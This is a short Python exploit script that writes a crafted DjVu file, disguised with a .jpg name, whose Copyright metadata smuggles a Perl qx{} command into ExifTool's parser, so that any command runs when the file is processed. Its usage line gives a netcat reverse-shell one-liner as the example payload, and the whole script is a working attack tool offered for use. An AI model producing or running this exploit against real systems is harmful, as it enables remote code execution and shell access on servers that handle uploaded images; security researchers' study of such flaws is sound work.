#!/usr/bin/python3

#
# ExifTool Command Execution DjVu Generator
# Generates a DjVu file that will execute arbitrary commands
# Works against ExifTool 
# 
# Base file from vkazz's report https://hackerone.com/reports/1154542
#

import sys

if (len(sys.argv) != 3):
    print("%s outputFile command" % sys.argv[0])
    print("ex: ./exifExploit.py out.jpg 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f'")
    sys.exit(0)
outfile = sys.argv[1]
payload = bytes(sys.argv[2], 'utf-8')

payloadLine = b'" . qx{' + payload + b'} . \\\n'

jpg = [b'AT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n', b'\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9\x7f*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\n', b'FORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n', b'\t(Copyright "\\\n', b'" . qx{echo vakzz >/tmp/vakzz} . \\\n', b'" b ") )                                                                                                                                                                                                                                                                                                                                                                                                                                     '] 
jpg[4] = payloadLine 
f = open(outfile, 'wb')
for line in jpg:
    f.write(line)
f.close()

print("Payload written to %s, run 'exiftool %s' to exploit" % (outfile, outfile))
